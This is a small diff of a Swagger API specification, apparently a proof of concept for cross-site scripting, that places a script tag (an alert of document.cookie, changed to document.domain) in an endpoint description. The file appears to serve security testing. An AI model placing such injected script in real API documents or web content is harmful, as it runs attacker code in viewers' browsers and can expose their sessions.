@@ -1,14 +1,17 @@
 {
   "swagger": "2.0",
   "info": {
-    "title": "XSS Test",
-    "version": "1.0"
+    "title": "XSS PoC",
+    "version": "1.0.0"
   },
+  "host": "example.com",
+  "basePath": "/",
+  "schemes": ["https"],
   "paths": {
     "/xss": {
       "get": {
-        "summary": "XSS Test",
-        "description": "<script>alert(document.cookie)</script>",
+        "summary": "XSS Injection Test",
+        "description": "<script>alert(document.domain)</script>",
         "responses": {
           "200": {
             "description": "Success"
